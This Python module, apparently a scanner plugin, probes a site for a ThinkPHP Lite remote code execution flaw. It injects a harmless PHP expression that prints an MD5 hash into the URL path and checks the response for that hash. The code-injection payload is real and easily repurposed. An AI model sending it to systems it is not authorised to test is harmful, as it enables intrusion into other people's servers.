"""  
@Time: 2024/2/28 16:32 
@Auth: Y5neKO
@File: Thinkphp_lite_code_exec.py 
@IDE: PyCharm 
"""
import urllib.parse
import requests


def run(url, timeout):
    RESULT_NAME = 'Thinkphp_lite_code_exec'
    EXPECTED_HASH = '56540676a129760a3'  # MD5 hash of '2333'
    PAYLOAD = 'index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D'

    result = {
        'name': RESULT_NAME,
        'vulnerable': False,
        'method': None,
        'url': None,
        'payload': None
    }

    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }

    try:
        vurl = urllib.parse.urljoin(url, PAYLOAD)
        response = requests.get(vurl, headers=headers, timeout=15)

        if EXPECTED_HASH in response.text:
            result['vulnerable'] = True
            result['method'] = 'GET'
            result['url'] = url
            result['payload'] = vurl

        return result

    except requests.exceptions.RequestException as e:
        # Log or handle the specific request exception
        print(f"An error occurred: {e}")
        return result